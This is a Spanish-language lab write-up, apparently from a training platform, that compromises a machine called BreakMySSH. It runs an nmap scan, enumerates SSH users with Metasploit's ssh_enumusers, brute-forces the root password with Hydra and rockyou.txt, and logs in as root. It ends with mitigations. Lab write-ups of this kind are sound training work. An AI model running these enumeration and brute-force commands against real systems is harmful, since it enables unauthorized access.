# BreakMySSH — SSH enumeration y acceso root 🔓🐧

## Resumen ejecutivo 🏁
- Objetivo: Enumerar y comprometer el servicio SSH en 172.17.0.3
- Servicio principal: SSH (OpenSSH 7.7)
- Resultado: Se enumeró un usuario válido (`root`) con Metasploit, se recuperó la contraseña (`estrella`) con Hydra y se obtuvo acceso SSH como root.

---

## 1) Escaneo de puertos 🧭
Comando usado:

```bash
nmap -p- --open -sS -sV --min-rate 2000 -n -Pn 172.17.0.3
```

Resultado relevante:

- 22/tcp open  ssh  OpenSSH 7.7 (protocol 2.0)

---

## 2) Enumeración de usuarios (Metasploit) 🔎
Se usó el módulo auxiliar de Metasploit para enumerar usuarios SSH:

- Módulo: auxiliary/scanner/ssh/ssh_enumusers
- Uso en msfconsole:

```text
msf > use auxiliary/scanner/ssh/ssh_enumusers
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.17.0.3
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /ruta/a/rockyou.txt   # opcional
msf auxiliary(scanner/ssh/ssh_enumusers) > run
```

Salida de ejemplo (véase imagen 1 y 2):

- Se listaron varios usuarios válidos, entre ellos `root`.

![Imagen 1 - Resultado de ssh_enumusers](images/1.png)

![Imagen 2 - Resultado de ssh_enumusers (duplicado/otro momento)](images/2.png)

Nota: Las imágenes están en la carpeta `images/` de esta máquina. Los nombres de archivo son 1.png, 2.png, 3.png, 4.png y corresponden a las capturas provistas.

---

## 3) Fuerza bruta con Hydra ⚔️
Con el usuario `root` identificado, se ejecutó Hydra contra SSH usando un wordlist (p. ej. rockyou.txt):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4
```

Resultado (ejemplo):

- host: 172.17.0.3  login: root  password: estrella

Captura (véase imagen 3):

![Imagen 3 - Resultado de Hydra (password encontrado)](images/3.png)

---

## 4) Acceso SSH 🛠️
Se inició sesión SSH con las credenciales encontradas:

```bash
ssh root@172.17.0.3
# password: estrella
```

Salida (ejemplo) y verificación de ser root:

![Imagen 4 - Sesión SSH como root](images/4.png)

---

## 5) Conclusión ✅
- La máquina BreakMySSH fue comprometida atacando únicamente el servicio SSH.
- Riesgo principal: enumeración de usuarios + contraseñas débiles → acceso root directo.

Mitigaciones recomendadas:
- Deshabilitar el login directo de `root` por SSH (PermitRootLogin no en `yes`).
- Forzar autenticación por clave pública (deshabilitar uso de passwords).
- Aplicar políticas de contraseñas robustas y bloqueos ante intentos repetidos.
- Filtrar/limitar acceso SSH por IP/VPN.

---

## Notas legales y de uso ⚠️
Este ejercicio se realizó con fines educativos y en un entorno controlado. No ejecutes ataques contra sistemas sin autorización expresada del propietario.

---

## Archivos relacionados 📁
- Esta writeup está en: `laboratorios/BreakMySSH/breakmyssh.md`
- Imágenes: `laboratorios/BreakMySSH/images/1.png` ... `4.png`

Si quieres que suba también las imágenes (si me las proporcionas) puedo añadirlas en la carpeta `images/` y actualizar los enlaces automáticamente.
